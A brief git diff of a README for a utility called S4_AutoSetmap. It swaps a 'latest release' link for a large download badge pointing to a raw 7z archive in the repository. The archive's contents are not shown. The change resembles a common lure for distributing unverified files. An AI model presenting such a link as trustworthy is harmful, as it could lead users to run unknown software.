@@ -13,7 +13,7 @@ This is a hobby/open-source utility and the repository contents are publicly vis
 
 ## 📥 Download
 
-[⬇ Download Latest Release](https://github.com/roxas359/S4_AutoSetmap/releases/latest)
+[![Download 7z](https://img.shields.io/badge/Download-7z%20File-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/roxas359/S4_AutoSetmap/main/S4_AutoSetmap_V02.7z)
 
 ## 🖼️ Preview
 
